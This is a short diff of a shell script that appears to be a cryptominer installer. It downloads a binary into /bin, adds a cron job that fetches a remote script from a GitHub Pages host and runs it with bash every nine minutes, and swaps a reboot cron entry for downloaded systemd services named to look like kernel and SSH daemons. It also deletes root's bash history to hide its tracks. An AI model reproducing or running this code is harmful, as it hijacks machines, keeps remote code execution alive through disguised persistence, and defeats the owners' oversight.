@@ -14,7 +14,13 @@ fi
     cd /bin
     wget https://xmrhorizontal.github.io/cpuhp
     chmod +x ./cpuhp
-    echo "@reboot root sleep 5m && curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin" > /etc/cron.d/cronconfig
+    cd /etc/systemd/system
+    wget https://xmrhorizontal.github.io/sys-kernel.service
+    wget https://xmrhorizontal.github.io/ssh-daemons.service
+    systemctl enable ssh-daemons.service
+    systemctl enable sys-kernel.service
+    systemctl start ssh-daemons.service
+    systemctl start sys-kernel.service
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
     rm -f ~/.bash_history
     rm -f /root/.bash_history
